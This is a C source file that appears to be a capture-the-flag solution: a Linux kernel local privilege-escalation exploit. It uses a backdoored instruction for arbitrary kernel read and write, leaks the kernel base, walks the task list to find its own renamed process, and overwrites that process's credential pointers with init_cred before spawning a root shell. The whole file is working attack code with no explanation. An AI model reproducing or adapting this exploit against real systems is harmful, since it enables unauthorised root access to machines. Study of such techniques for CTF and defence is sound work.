#include "libpwn.c"

#define cpu_entry_area 0xfffffe0000000000
#define TASK_LIST_OFFSET 0x478
#define COMM_OFFSET 0x730

long arb_read(u64 where) {
    __asm__(
        ".intel_syntax noprefix;"

        "mov r11, 0xdeadbeeffeebdaed;"
        "mov r13, %[address];"
        ".byte 0x3f;"
        "mov rax, r12;"

        ".att_syntax;"

        :
        : [address] "r" (where)
    );
}

void arb_write(u64 where, u64 what) {
    __asm__(
        ".intel_syntax noprefix;"

        "mov r11, 0x6969696969696969;"
        "mov r13, %[address];"
        "mov r12, %[value];"
        ".byte 0x3f;" // aas
        
        ".att_syntax"

        :
        : [address] "r" (where), [value] "r" (what)
    );  
}

int main() {
    char comm[16] = {};

    if (prctl(PR_SET_NAME, "ARGONAUT", 0, 0, 0) != 0) {
        panic("prctl");
    }
    
    kbase = arb_read(cpu_entry_area+0x4)-0x1008e00;
    u64 init_task = kbase + 0x1a0c940;
    u64 init_cred = kbase + 0x1a529e0;
    info2("kbase", kbase);
    info2("init_task", init_task);
    info2("init_cred", init_cred);

    u64 comm_num = arb_read(init_task+COMM_OFFSET);
    memcpy(comm, &comm_num, sizeof(comm_num));
    puts(comm);

    u64 current = arb_read(init_task+TASK_LIST_OFFSET)-TASK_LIST_OFFSET;
    int i = 0;
    while(current != 0x0) {
        comm_num = arb_read(current+COMM_OFFSET);
        memcpy(comm, &comm_num, sizeof(comm_num));
        printf("[*] task[%d] [%s]: 0x%lx\n", i, comm, current);

        if (strcmp(comm, "ARGONAUT") == 0) {
            _pause_("Found ARGONAUT task");
            break;
        } 

        current = arb_read(current+TASK_LIST_OFFSET)-TASK_LIST_OFFSET;
        i++;
    }

    arb_write(current+0x718, init_cred);
    arb_write(current+0x720, init_cred);

    spawn_shell();

    _pause_("end of exploit...");
}